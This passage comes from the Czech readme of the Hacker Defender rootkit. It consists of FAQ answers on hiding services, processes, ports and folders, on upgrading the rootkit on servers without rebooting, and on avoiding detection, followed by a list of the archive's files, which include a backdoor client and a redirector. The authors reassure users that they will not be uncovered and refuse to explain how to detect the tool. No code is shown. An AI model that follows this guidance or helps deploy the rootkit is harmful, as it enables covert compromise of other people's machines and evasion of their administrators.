Q: Kdy bude nova verze?

A: Vyvojari koduji tento program v jejich volnem case. Neberou za to zadne 
penize a nechteji za to brat zadne penize. Vyvojari jsme pouze dva a myslime 
si, ze je to pro tento projekt dostacujici. Toto znamena, ze nekodujem tak 
rychle jako microsoft, a ze byste meli cekat a neptat se kdy bude nova verze.
Narozdil od microsoftu nas produkt je zdarma a mame dobre betatestery 
a testujeme hodne moc, takze nase public verze jsou stabilni.


11) 
Q: Pomoci prikazu net.exe muzu zastavit skryte sluzby, je to bug?

A: Neni to bug, je to vlastnost hxdefu. K zastaveni sluzby porad jeste 
potrebujete znat jeji jmeno a to zna pouze ten, kdo ji nainstaloval, takze se 
nebojte, ze tudy vas mohou odhalit.


12) 
Q: Je nejaka moznost odhalit tento rootkit?

A: Ano. Je mnoho mnoho cest jak detekoavt jakykoliv rootkit a tento neni 
(a ani nemuze byt) vyjimkou. Kazdy rootkit lze detekovat. Jedine otazky zde 
jsou jak je to slozite a zda jiz nekdo udelal program, ktery rootkit detekuje.


13) 
Q: Jak je tedy slozite odhalit hxdef? A uz nekdo udelal program, ktery to 
dokaze? 

A: Je velmi velmi jednoduche detekovat hxdef, ale zatim nevim o zadne 
specialnim programu, ktery by rekl, ze je hxdef na systemu nainstalovan.


14) 
Q: Jak tedy hxdef detekovat?

A: To vam rozhodne nereknu :)


15) 
Q: Znamena 0 na zacatku oznaceni verze, ze je tato verze nestabilni?

A: Rozhodne ne. Nula na pocatku znamena pouze to, ze jeste existuji veci, 
ktere chceme implementovat, a ze zdrojovy kod je uzavreny a ve vyvoji.


16) 
Q: Kdy bude k dispozici zdrojovy kod? Cetl jsem, ze s verzi 1.0.0, ale kdy?

A: Opravdu nevim. Je zde jeste nekolik veci, ktere chceme implementovat pred 
vydanim verze 1.0.0. Muze to trvat pul roku stejne tak dobre, jako rok nebo 
dele.


17) 
Q: Chci byt betatester, co mam udelat?

A: Napiste mi mail o tom, jak muzete spolupracovat, jake mate zkusenosti 
s betatestingem a co umite. Ale nepocitejte moc s tim, ze vas prijmu jako 
testera. Aktualne je betatesteru pro tento projekt dost a neni potreba zvysovat
jejich pocet.


18) 
Q: Je legalni pouzivat tento program?

A: Jiste, ze ano. Ale lze ho jednoduse zneuzit k ilegalnim aktivitam.


19) 
Q: Je mozne nahrat tuto verzi hxdefu na server se starou verzi? Je to mozne 
bez rebootu?

A: Neni to mozne bez rebootu. Muzete updatovat tak, ze manualne odstranite 
starou verzi, rebootujete a pak nainstalujete novou.


20) 
Q: Je mozne nahrat budouci verzi na server s touto verzi hxdefu? Je to mozne 
bez rebootu?

A: Ano! Pouzijte -:uninstall pro uplne odstraneni hxdefu bez rebootu. Pote 
jednoduse nainstalujte novou verzi.

 
21) 
Q: Je lepsi pouzit -:uninstall nebo net stop ServiceName?

A: Pouzivejte -:uninstall, kdy to jen jde. Ale net stop funguje stejne dobre.


22) 
Q: Zboznuji tento program. Muzu vam pomoci nejakym financnim prispevkem?

A: My tyto penize nepoterbujeme, ale budeme radi, pokud prispejete nejake 
charitativni organizaci ve vasem kraji a napisete nam o tom mail.


23) 
Q: Je nejaka moznost skryt C:\temp, ale neskryt C:\winnt\temp?

A: Ne. Vytvorte si vlastni adresar se specifickym jmenem a dejte toto jmeno 
do Hidden Table.
 

24) 
Q: Vidim, ze heslo je v inifilu v plaintextu! Jak je to mozne?

A: Asi si myslite, ze je to spatne z bezpecnostniho hlediska, ale pokud 
skryvate vas inifile, nikdo ho cist nebude. Takze je to bezpecne. A takto je 
navic snadne kdykoliv zmenit heslo pomoci -:refresh.


25) 
Q: Kdyz mam process v Hidden Processes a tento posloucha na portu, je tento 
port automaticky skryty nebo ho mam napsat do Hidden Ports?

A: Skryvaji se pouze porty uvedene v Hidden Ports. Takze ano, napiste ho do 
Hidden Ports.



=====[ 8. Soubory ]=============================================================

        Originalni archiv Hacker defender v1.0.0 obsahuje tyto soubory:

hxdef100.exe    70 656 b        - program Hacker defender v1.0.0
hxdOFdis.exe    70 656 b        - program Hacker defender v1.0.0 kompilovany 
                                  s vypnutim hookovani NtOpenFile
hxdef100.ini     4 119 b        - inifile s defaultnim nastavenim
hxdef100.2.ini   3 924 b        - inifile s defaultnim nastavenim, varianta 2
bdcli100.exe    26 624 b        - klient backdooru
rdrbs100.exe    49 152 b        - baze redirektoru
readmecz.txt    37 407 b        - toto readme 
readmeen.txt    37 905 b        - anglicka verze tohoto readme
src.zip         93 679 b        - archiv zdrojovych kodu

===================================[ End ]======================================
